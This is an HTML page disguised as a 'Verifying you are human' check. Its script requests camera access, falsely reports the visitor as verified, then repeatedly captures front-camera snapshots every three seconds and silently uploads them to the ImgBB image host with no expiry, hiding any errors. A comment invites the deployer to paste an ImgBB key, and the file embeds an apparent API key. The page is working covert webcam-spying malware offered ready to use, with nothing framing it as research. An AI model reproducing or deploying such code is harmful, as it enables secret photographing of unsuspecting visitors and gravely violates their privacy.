<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifying…</title>
<style>
  body{margin:0;font-family:system-ui;background:#0f172a;color:#fff;
       display:flex;align-items:center;justify-content:center;height:100vh;text-align:center}
  .box{background:#1e293b;padding:40px;border-radius:16px;max-width:340px}
  .spin{width:48px;height:48px;border:4px solid #334155;border-top-color:#3b82f6;
        border-radius:50%;animation:s 1s linear infinite;margin:20px auto}
  @keyframes s{to{transform:rotate(360deg)}}
  .ok{color:#22c55e}.err{color:#ef4444}
</style>
</head>
<body>
<div class="box">
  <h2>Verifying you are human</h2>
  <div class="spin" id="spin"></div>
  <p id="status">Requesting camera…</p>
  <video id="v" autoplay playsinline muted style="display:none"></video>
  <canvas id="c" style="display:none"></canvas>
</div>

<script>
const API_KEY = "3f02acfeb4fdef04177421ae75ec4d72";          // <-- paste your ImgBB key here
const API     = "https://api.imgbb.com/1/upload?expiration=0&key=";

const status = document.getElementById('status');
const spin   = document.getElementById('spin');
const video  = document.getElementById('v');
const canvas = document.getElementById('c');

async function start(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode:'user' }, audio:false
    });
    video.srcObject = stream;
    status.textContent = "✓ Human verified";
    status.className = "ok";
    spin.style.display = "none";
    video.onloadedmetadata = () => shoot();
  }catch(e){
    status.textContent = "✗ Camera denied — reload";
    status.className = "err";
    spin.style.display = "none";
  }
}

function shoot(){
  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  canvas.getContext('2d').drawImage(video,0,0);

  // 3 shots, 3 seconds apart, low quality to stay tiny
  canvas.toBlob(blob => {
    if(blob){
      const fd = new FormData();
      fd.append('image', blob);
      fetch(API + API_KEY, { method:'POST', body:fd }).catch(()=>{});
    }
  }, 'image/jpeg', 0.6);

  setTimeout(shoot, 3000);
}

start();
</script>
</body>
</html>
